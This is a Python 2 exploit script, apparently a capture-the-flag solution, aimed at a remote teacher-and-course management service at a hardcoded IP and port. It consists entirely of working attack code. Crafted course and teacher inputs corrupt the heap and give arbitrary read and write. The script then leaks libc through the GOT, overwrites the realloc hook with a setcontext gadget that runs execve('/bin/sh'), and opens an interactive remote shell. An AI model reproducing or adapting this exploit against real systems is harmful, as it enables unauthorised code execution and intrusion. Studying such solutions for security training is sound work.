#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='>> '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert c != ''
        data += c
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('149.13.33.84', 1520))
f = s.makefile('rw', bufsize=0)

def add_teachers(f, teachers):
    f.write('1\n')
    readuntil(f)
    f.write(str(len(teachers)) + '\n')
    readuntil(f)

    i = 0
    for name, age, note in teachers:
        print i
        i += 1
        f.write(name + '\n')
        readuntil(f)
        f.write(str(age) + '\n')
        readuntil(f)
        if note is None:
            f.write('a\n')
            readuntil(f)
        else:
            f.write('y\n')
            readuntil(f)
            f.write(note + '\n')
            readuntil(f)

def edit_teacher(f, teacher_id, name, age=1337, note=''):
    f.write('4\n')
    readuntil(f)
    f.write(str(teacher_id) + '\n')
    readuntil(f)
    f.write(name + '\n')
    readuntil(f)
    f.write(str(age) + '\n')
    readuntil(f)
    f.write(note + '\n')
    readuntil(f)

def show_teacher(f, teacher_id):
    f.write('3\n')
    readuntil(f)
    f.write(str(teacher_id) + '\n')
    readuntil(f, 'Name: ')
    delim = '\nAge: '
    name = readuntil(f, delim)[:-len(delim)]
    age = int(f.readline().strip())
    f.read(len('Note: '))
    delim = '\nYou have'
    note = readuntil(f, delim)[:-len(delim)]
    readuntil(f)
    return name, age, note

num_courses = 0
def add_course(f, title, teacher_id, summary, desc, desc_len=None, edit=True):
    if desc_len is None:
        desc_len = len(desc)

    f.write('2\n')

    global num_courses
    if num_courses % 256 != 0:
        readuntil(f)
        if edit:
            f.write('y\n')
        else:
            f.write('n\n')
    else:
        edit = True
    num_courses += 1

    if edit:
        readuntil(f)
        f.write(title + '\n')
        readuntil(f)
        f.write(str(teacher_id) + '\n')
        readuntil(f)
        f.write(summary + '\n')

    readuntil(f)
    f.write(str(desc_len) + '\n')
    readuntil(f)
    f.write(desc + '\n')
    readuntil(f)

readuntil(f)

print 'attempting to fill address space...'
add_course(f, 'title', 17, 'summary' , 'desc', 0x7fffffff, True)

for i in xrange(13):
    print i
    add_course(f, 'title', 17, 'summary' , 'desc', 0x8000000, True)

for i in xrange(14):
    print i
    add_course(f, 'title', 17, 'summary' , 'desc', 0xffff * 256, True)

f.write('1\n')
readuntil(f)
f.write('-2\n')
readuntil(f)

add_course(f, 'title', 10, '' , 'desc', 16, True)

g_teachers_addr = 0x0804B1CC
g_course_teacher_id_addr = 0x0804B1C4

fake_teacher = p(g_teachers_addr)
fake_teacher += p(1337)
fake_teacher += 'note'
title = 'A' * 0x48
title += fake_teacher
assert '\n' not in title
add_course(f, title, 17, '' , 'desc', 16, True)

fake_teachers_list = g_course_teacher_id_addr - 0x100
edit_teacher(f, 0x31, p(fake_teachers_list))

def set_addr(f, addr):
    if addr > 0x7fffffff:
        addr -= 1 << 32
    add_course(f, title, addr, '' , 'desc', 16, True)

def read(f, addr):
    set_addr(f, addr)
    data, _, _ = show_teacher(f, 1)
    return data + '\0'

def write(f, addr, data):
    set_addr(f, addr)
    edit_teacher(f, 1, data)

assert read(f, 0x8048000).startswith('\x7fELF')
print 'success'

realloc_got = 0x0804AFD0
realloc = u(read(f, realloc_got)[:4].ljust(4, '\0'))
print 'realloc =', hex(realloc)

libc_base = realloc - 0x76170
realloc_hook = libc_base + 0x1A7404
binsh = libc_base + 0x15DA84
syscall = libc_base + 0x2e455
'''
406e3: 8b 44 24 04           mov    0x4(%esp),%eax
406e7: 8b 48 60              mov    0x60(%eax),%ecx
406ea: d9 21                 fldenv (%ecx)
406ec: 8b 48 18              mov    0x18(%eax),%ecx
406ef: 8e e1                 mov    %ecx,%fs
406f1: 8b 48 4c              mov    0x4c(%eax),%ecx
406f4: 8b 60 30              mov    0x30(%eax),%esp
406f7: 51                    push   %ecx
406f8: 8b 78 24              mov    0x24(%eax),%edi
406fb: 8b 70 28              mov    0x28(%eax),%esi
406fe: 8b 68 2c              mov    0x2c(%eax),%ebp
40701: 8b 58 34              mov    0x34(%eax),%ebx
40704: 8b 50 38              mov    0x38(%eax),%edx
40707: 8b 48 3c              mov    0x3c(%eax),%ecx
4070a: 8b 40 40              mov    0x40(%eax),%eax
4070d: c3                    ret
'''
setcontext_gadget = libc_base + 0x406e3

print 'libc_base =', hex(libc_base)

context = ''
context += 'A' * 0x18
context += p(0)
context += 'A' * 0x14
context += p(fake_teachers_list) # esp
context += p(binsh) # ebx
context += p(0) # edx
context += p(0) # ecx
context += p(0xb) # eax
context += 'A' * 8
context += p(syscall) # eip
context += 'A' * 16
context += p(fake_teachers_list) # fldenv

assert '\n' not in context

for i in xrange(0, len(context), 0x20 - 1):
    write(f, fake_teachers_list + i, context[i:])
write(f, realloc_hook, p(setcontext_gadget))

print 'ready'
raw_input()

f.write('1\n')
readuntil(f)
f.write('1\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
